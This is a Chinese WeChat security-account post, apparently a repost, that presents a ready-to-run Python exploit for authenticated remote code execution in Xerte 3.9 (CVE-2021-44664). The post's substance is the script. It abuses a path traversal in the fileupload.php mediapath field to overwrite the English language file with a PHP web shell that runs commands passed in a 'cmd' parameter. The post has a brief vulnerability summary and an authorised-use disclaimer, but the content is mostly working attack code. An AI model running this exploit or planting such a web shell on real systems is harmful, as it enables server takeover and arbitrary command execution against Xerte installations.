#  【0day EXP】Xerte3.9远程执行代码（RCE）

原创 网络先行者  [ 桓星安全实验室 ](javascript:void\(0\);)

**桓星安全实验室** ![]()

微信号 Huanxingsys

功能介绍 桓星安全实验室，创立于2023年5月3号，专注于信息安全普及，人才培养

____

___发表于_

收录于合集

#零日漏洞 11 个

#网络安全 25 个

VALENTINE'S DAY

VALENTINE'S DAY

VALENTINE'S DAY

VALENTINE'S DAY

VALENTINE'S DAY

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失,均由使用者本人负责，EXP 与 POC
仅仅只供对已授权的目标使用测试，对未授权目标的测试本公众号不承担责任，均由本人自行承担。本公众号中的漏洞均为公开的漏洞收集！如果本文您认为不适宜被发布，请在后台联系我们删除，或发送到运营的电子邮箱：tang_wenshu@outlook.com。

VALENTINE'S DAY

VALENTINE'S DAY

VALENTINE'S DAY

VALENTINE'S DAY

VALENTINE'S DAY

  

## 漏洞说明

Xerte项目旨在为世界各地的教育工作者提供高质量的免费软件，并建立一个全球用户和开发人员社区。

 **漏洞类型：** 命令执行漏洞

 **漏洞危害：** 高危

 **影响版本：** Version 3.9

## 漏洞EXP

    
    
    # Exploit Title: Xerte 3.9 - Remote Code Execution (RCE) (Authenticated)  
    # Date: 05/03/2021  
    # Exploit Author: Rik Lutz  
    # Vendor Homepage: https://xerte.org.uk  
    # Software Link: https://github.com/thexerteproject/xerteonlinetoolkits/archive/refs/heads/3.8.5-33.zip  
    # Version: up until version 3.9  
    # Tested on: Windows 10 XAMP   
    # CVE : CVE-2021-44664  
      
    # This PoC assumes guest login is enabled and the en-GB langues files are used.   
    # This PoC wil overwrite the existing langues file (.inc) for the englisch index page with a shell.  
    # Vulnerable url: https://<host>/website_code/php/import/fileupload.php  
    # The mediapath variable can be used to set the destination of the uploaded.  
    # Create new project from template -> visit "Properties" (! symbol) -> Media and Quota  
      
    import requests  
    import re  
      
    xerte_base_url = "http://127.0.0.1"  
    php_session_id = "" # If guest is not enabled, and you have a session ID. Put it here.  
      
    with requests.Session() as session:  
        # Get a PHP session ID  
        if not php_session_id:  
            session.get(xerte_base_url)   
        else:  
            session.cookies.set("PHPSESSID", php_session_id)  
      
         # Use a default template  
        data = {  
            'tutorialid': 'Nottingham',  
            'templatename': 'Nottingham',  
            'tutorialname': 'exploit',  
            'folder_id': ''  
        }  
      
        # Create a new project in order to find the install path  
        template_id = session.post(xerte_base_url + '/website_code/php/templates/new_template.php', data=data)  
      
        # Find template ID  
        data = {  
            'template_id': re.findall('(\d+)', template_id.text)[0]  
        }  
      
        # Find the install path:  
        install_path = session.post(xerte_base_url + '/website_code/php/properties/media_and_quota_template.php', data=data)  
        install_path = re.findall('mediapath" value="(.+?)"', install_path.text)[0]  
      
        headers = {  
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0',  
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',  
            'Accept-Language': 'nl,en-US;q=0.7,en;q=0.3',  
            'Content-Type': 'multipart/form-data; boundary=---------------------------170331411929658976061651588978',  
           }  
      
        # index.inc file  
        data = \  
        '''-----------------------------170331411929658976061651588978  
    Content-Disposition: form-data; name="filenameuploaded"; filename="index.inc"  
    Content-Type: application/octet-stream  
      
    <?php  
    if(isset($_REQUEST[\'cmd\'])){ echo "<pre>"; $cmd = ($_REQUEST[\'cmd\']); system($cmd); echo "</pre>"; die; }  
    /**  
     *  
     * index.php english language file  
     *  
     * @author Patrick Lockley  
     * @version 1.0  
     * @copyright Pat Lockley  
     * @package  
     */  
      
    define("INDEX_USERNAME_AND_PASSWORD_EMPTY", "Please enter your username and password");  
      
    define("INDEX_USERNAME_EMPTY", "Please enter your username");  
      
    define("INDEX_PASSWORD_EMPTY", "Please enter your password");  
      
    define("INDEX_LDAP_MISSING", "PHP\'s LDAP library needs to be installed to use LDAP authentication. If you read the install guide other options are available");  
      
    define("INDEX_SITE_ADMIN", "Site admins should log on on the manangement page");  
      
    define("INDEX_LOGON_FAIL", "Sorry that password combination was not correct");  
      
    define("INDEX_LOGIN", "login area");  
      
    define("INDEX_USERNAME", "Username");  
      
    define("INDEX_PASSWORD", "Password");  
      
    define("INDEX_HELP_TITLE", "Getting Started");  
      
    define("INDEX_HELP_INTRODUCTION", "We\'ve produced a short introduction to the Toolkits website.");  
      
    define("INDEX_HELP_INTRO_LINK_TEXT","Show me!");  
      
    define("INDEX_NO_LDAP","PHP\'s LDAP library needs to be installed to use LDAP authentication. If you read the install guide other options are available");  
      
    define("INDEX_FOLDER_PROMPT","What would you like to call your folder?");  
      
    define("INDEX_WORKSPACE_TITLE","My Projects");  
      
    define("INDEX_CREATE","Project Templates");  
      
    define("INDEX_DETAILS","Project Details");  
      
    define("INDEX_SORT","Sort");  
      
    define("INDEX_SEARCH","Search");  
      
    define("INDEX_SORT_A","Alphabetical A-Z");  
      
    define("INDEX_SORT_Z","Alphabetical Z-A");  
      
    define("INDEX_SORT_NEW","Age (New to Old)");  
      
    define("INDEX_SORT_OLD","Age (Old to New)");  
      
    define("INDEX_LOG_OUT","Log out");  
      
    define("INDEX_LOGGED_IN_AS","Logged in as");  
      
    define("INDEX_BUTTON_LOGIN","Login");  
      
    define("INDEX_BUTTON_LOGOUT","Logout");  
      
    define("INDEX_BUTTON_PROPERTIES","Properties");  
      
    define("INDEX_BUTTON_EDIT","Edit");  
      
    define("INDEX_BUTTON_PREVIEW", "Preview");  
      
    define("INDEX_BUTTON_SORT", "Sort");  
      
    define("INDEX_BUTTON_NEWFOLDER", "New Folder");  
      
    define("INDEX_BUTTON_NEWFOLDER_CREATE", "Create");  
      
    define("INDEX_BUTTON_DELETE", "Delete");  
      
    define("INDEX_BUTTON_DUPLICATE", "Duplicate");  
      
    define("INDEX_BUTTON_PUBLISH", "Publish");  
      
    define("INDEX_BUTTON_CANCEL", "Cancel");  
      
    define("INDEX_BUTTON_SAVE", "Save");  
      
    define("INDEX_XAPI_DASHBOARD_FROM", "From:");  
      
    define("INDEX_XAPI_DASHBOARD_UNTIL", "Until:");  
      
    define("INDEX_XAPI_DASHBOARD_GROUP_SELECT", "Select group:");  
      
    define("INDEX_XAPI_DASHBOARD_GROUP_ALL", "All groups");  
      
    define("INDEX_XAPI_DASHBOARD_SHOW_NAMES", "Show names and/or email addresses");  
      
    define("INDEX_XAPI_DASHBOARD_CLOSE", "Close dashboard");  
      
    define("INDEX_XAPI_DASHBOARD_DISPLAY_OPTIONS", "Display options");  
      
    define("INDEX_XAPI_DASHBOARD_SHOW_HIDE_COLUMNS", "Show / hide columns");  
      
    define("INDEX_XAPI_DASHBOARD_QUESTION_OVERVIEW", "Interaction overview");  
      
    define("INDEX_XAPI_DASHBOARD_PRINT", "Print");  
    \r  
    \r  
    -----------------------------170331411929658976061651588978  
    Content-Disposition: form-data; name="mediapath"  
      
    ''' \  
        + install_path \  
        + '''../../../languages/en-GB/  
    -----------------------------170331411929658976061651588978--\r  
    '''  
      
        # Overwrite index.inc file  
        response = session.post(xerte_base_url + '/website_code/php/import/fileupload.php', headers=headers, data=data)  
        print('Installation path: ' + install_path)  
        print(response.text)  
        if "success" in response.text:  
            print("Visit shell @: " + xerte_base_url + '/?cmd=whoami')  
                  
    

![](https://gitee.com/fuli009/images/raw/master/public/20230714175644.png)

![](https://gitee.com/fuli009/images/raw/master/public/20230714175645.png)

  

![](https://gitee.com/fuli009/images/raw/master/public/20230714175646.png)

后台回复“粉丝群”加入公众号粉丝群

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

